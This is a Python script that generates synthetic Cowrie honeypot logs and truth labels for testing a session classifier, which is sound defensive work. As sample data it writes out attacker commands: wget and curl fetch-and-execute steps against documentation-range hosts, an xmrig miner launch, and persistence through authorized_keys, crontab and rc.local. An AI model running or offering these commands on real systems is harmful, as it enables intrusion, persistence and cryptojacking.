# gen_synth_logs.py - makes fake cowrie style logs
# everything this makes is SYNTHETIC. it is not real attacker data
# i use it to build and test my sessionizer and classifier before i touch real logs

import json
import random
from datetime import datetime, timedelta

# how many fake sessions i want
how_many = 300

# same seed every time so i get the same fake file every time
random.seed(1)

# ---------- the lists i pick from ----------

# fake ips. these ranges are reserved for documentation so they are never real
fake_ips = []
for start in ["192.0.2.", "198.51.100.", "203.0.113."]:
    for n in range(1, 60):
        fake_ips.append(start + str(n))

# fake usernames and passwords. common guesses that bots try
fake_users = ["root", "admin", "ubuntu", "pi", "test", "user", "oracle", "postgres"]
fake_passwords = ["123456", "password", "admin", "root", "toor", "raspberry", "1234", "qwerty", "test"]

# ssh client names. my real log has the same kind of field called version
client_versions = ["SSH-2.0-libssh2_1.9.0", "SSH-2.0-paramiko_2.7.2", "SSH-2.0-Go", "SSH-2.0-OpenSSH_8.4"]

# commands for recon sessions. i pick a few of them at random
recon_commands = ["uname -a", "whoami", "cat /proc/cpuinfo", "free -m", "ls -la", "ps aux", "lscpu"]

# the 8 labels i planned for the classifier. the sessions take turns
kinds = ["scan_only", "bruteforce_fail", "login_no_commands", "recon", "dropper", "persistence", "miner", "human_like"]

# letters for fake ids and fake hashes
hex_letters = "0123456789abcdef"

# first day of the fake logs. the sessions spread over 14 days
first_day = datetime(2026, 1, 1, 0, 0, 0)

# ---------- small functions ----------

# makes a fake id or hash with the length i ask for
# i use it for session ids (12) hassh (32) and shasum (64)
def make_hex(length):
    text = ""
    for n in range(length):
        text = text + random.choice(hex_letters)
    return text

# makes one event with the fields every event has in my real log
# the extra fields like input or username i add after
def make_event(eventid, sid, ip, when):
    event = {}
    event["eventid"] = eventid
    event["session"] = sid
    event["src_ip"] = ip
    event["timestamp"] = when.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    event["sensor"] = "synth-sensor"
    return event

# tells sort() to sort the events by their timestamp text
def get_time(event):
    return event["timestamp"]

# ---------- build the sessions ----------

# every event goes in this list. the truth rows go in the other one
all_events = []
truth_rows = []

for i in range(how_many):
    # the kinds take turns so every kind gets the same number of sessions
    kind = kinds[i % 8]

    # fake session id with 12 characters like my real ones
    sid = make_hex(12)
    ip = random.choice(fake_ips)

    # random start time somewhere in the 14 days
    start_time = first_day + timedelta(seconds=random.randint(0, 14 * 86400))
    now = start_time

    # connect event. every session has one
    event = make_event("cowrie.session.connect", sid, ip, now)
    event["src_port"] = random.randint(1024, 65000)
    event["dst_port"] = 2222
    all_events.append(event)

    # client version and kex events. scan_only sessions skip them
    # my real log has 178 of these and 179 connects. my guess is one session left before the ssh talk started
    if kind != "scan_only":
        event = make_event("cowrie.client.version", sid, ip, now)
        event["version"] = random.choice(client_versions)
        all_events.append(event)

        # hassh is the fingerprint of the ssh client
        event = make_event("cowrie.client.kex", sid, ip, now)
        event["hassh"] = make_hex(32)
        all_events.append(event)

    # how many failed logins. scan_only has none
    fails = 0
    if kind == "bruteforce_fail":
        fails = random.randint(3, 8)
    elif kind != "scan_only":
        fails = random.randint(0, 2)

    for n in range(fails):
        now = now + timedelta(seconds=random.uniform(0.3, 2))
        event = make_event("cowrie.login.failed", sid, ip, now)
        event["username"] = random.choice(fake_users)
        event["password"] = random.choice(fake_passwords)
        all_events.append(event)

    # one good login for every kind except scan_only and bruteforce_fail
    if kind != "scan_only" and kind != "bruteforce_fail":
        now = now + timedelta(seconds=random.uniform(0.3, 2))
        event = make_event("cowrie.login.success", sid, ip, now)
        event["username"] = random.choice(fake_users)
        event["password"] = random.choice(fake_passwords)
        all_events.append(event)

    # the commands of each kind. login_no_commands stays empty on purpose
    commands = []
    if kind == "recon":
        commands = random.sample(recon_commands, random.randint(2, 5))
    elif kind == "dropper":
        commands = ["cd /tmp", "wget http://198.51.100.200/bins.sh", "chmod +x bins.sh", "./bins.sh"]
    elif kind == "persistence":
        # three ways to stay: ssh key or cron or rc.local
        way = random.randint(0, 2)
        if way == 0:
            commands = ["mkdir -p ~/.ssh", 'echo "ssh-rsa AAAAFAKEKEY synth" >> ~/.ssh/authorized_keys']
        elif way == 1:
            commands = ["crontab -l", 'echo "* * * * * /tmp/x" | crontab -']
        else:
            commands = ['echo "/tmp/x" >> /etc/rc.local']
    elif kind == "miner":
        commands = ["cd /tmp", "curl -O http://203.0.113.222/xmrig", "chmod +x xmrig", "./xmrig --url stratum+tcp://pool.invalid:3333"]
    elif kind == "human_like":
        commands = ["ls", "cd /tmp", "ls -la", "whoami"]

    for command in commands:
        # a human waits long and uneven. a bot is fast
        if kind == "human_like":
            now = now + timedelta(seconds=random.uniform(20, 70))
        else:
            now = now + timedelta(seconds=random.uniform(0.2, 4))

        event = make_event("cowrie.command.input", sid, ip, now)
        event["input"] = command
        all_events.append(event)

        # wget and curl also make a file download event with a url and a hash
        if command.startswith("wget") or command.startswith("curl"):
            event = make_event("cowrie.session.file_download", sid, ip, now)
            event["url"] = command.split()[-1]
            event["shasum"] = make_hex(64)
            all_events.append(event)

    # closed event with the length of the session in milliseconds
    now = now + timedelta(seconds=random.uniform(0.5, 5))
    event = make_event("cowrie.session.closed", sid, ip, now)
    event["duration_ms"] = int((now - start_time).total_seconds() * 1000)
    all_events.append(event)

    # the right answer for this session. i use it later to check my classifier
    truth_rows.append(sid + "," + kind)

# ---------- the 2 bad cases for my tests ----------

# bad case 1: a session that has a connect event and never closes
event = make_event("cowrie.session.connect", "synthnoclose", "192.0.2.99", first_day + timedelta(days=15))
event["src_port"] = 41000
event["dst_port"] = 2222
all_events.append(event)
truth_rows.append("synthnoclose,no_close_event")

# ---------- write the files ----------

# sort all events by time like a real log
all_events.sort(key=get_time)

out = open("data/synth.json", "w")
for event in all_events:
    out.write(json.dumps(event) + "\n")

# bad case 2: one broken line that is not json. my sessionizer must skip it
out.write("this line is broken {\n")
out.close()

truth = open("data/synth_truth.csv", "w")
truth.write("session,label\n")
for row in truth_rows:
    truth.write(row + "\n")
truth.close()

print("done. " + str(len(all_events)) + " events and 1 broken line. SYNTHETIC")